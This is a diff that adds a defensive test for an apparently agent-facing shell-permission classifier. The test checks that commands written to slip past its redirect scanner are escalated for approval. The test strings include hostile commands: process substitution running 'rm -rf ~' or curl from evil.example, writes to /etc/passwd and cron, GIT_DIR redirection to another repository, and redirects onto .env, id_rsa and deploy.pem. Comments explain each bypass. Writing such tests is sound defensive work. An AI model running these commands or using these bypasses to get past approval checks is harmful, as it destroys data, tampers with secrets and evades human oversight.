@@ -4127,6 +4127,43 @@ def test_classify_permission_escalates_redirect_without_worktree(spoke_repo: Pat
     assert result.stdout.strip() == "ESCALATE"
 
 
+@pytest.mark.parametrize(
+    "cmd",
+    [
+        # (#282 review 1) process substitution EXECUTES a command; the redirect scanner must not
+        # strip the `>`/`<` and treat `(cmd` as a benign file target — the shell runs the embedded
+        # command. Both output `>(…)` and input `<(…)` forms.
+        "./scripts/dev/afk-gate-smoke.sh >(rm -rf ~)",
+        "./x <(curl https://evil.example/x)",
+        # (#282 review 2) bash `>&FILE` / `n>&FILE` with a NON-numeric word writes stdout(+stderr)
+        # to a FILE — it is NOT an fd-duplication. An out-of-tree such target must not be skipped.
+        "echo pwned >&/etc/passwd",
+        "./scripts/spoke-push.sh --ready 5 1>&/etc/cron.d/payload",
+        # (#282 review 3) a leading GIT_DIR=/GIT_WORK_TREE= env assignment redirects a "safe" git
+        # verb at ANOTHER repo; the approve-side strip must NOT peel env assignments the way the
+        # tier-2 danger strip does.
+        "GIT_DIR=../sibling/.git git fetch origin",
+        "GIT_WORK_TREE=/tmp/x git add -A",
+        "env GIT_DIR=../sibling/.git git reset -q",
+        # (#282 review 4) a redirect target that is a secret-like path clobbers/feeds a secret the
+        # mutation lane refuses to touch — the redirect validator must apply the same secret guard.
+        "echo x >.env",
+        "./scripts/dev/afk-gate-smoke.sh >id_rsa",
+        "nohup ./scripts/spoke-push.sh --ready 5 >deploy.pem 2>&1",
+    ],
+)
+def test_classify_permission_escalates_review_found_redirect_bypasses(
+    cmd: str, spoke_repo: Path, tmp_path: Path
+) -> None:
+    # The four tier-1 bypasses the #282 high-effort review confirmed: process substitution, the
+    # `>&FILE` write-both-to-a-file form, a GIT_DIR/env-assignment prefix, and a secret-like
+    # redirect target. Each must escalate — the strict scanner bails on the exotic redirect forms,
+    # the approve-side strip peels only nohup/setsid, and secret-like targets are rejected.
+    tasks = tmp_path / "tasks"
+
+    assert _classify_with_wt(cmd, spoke_repo, tasks) == "ESCALATE"
+
+
 def test_classify_permission_escalates_brace_expansion_escape(
     spoke_repo: Path, tmp_path: Path
 ) -> None:
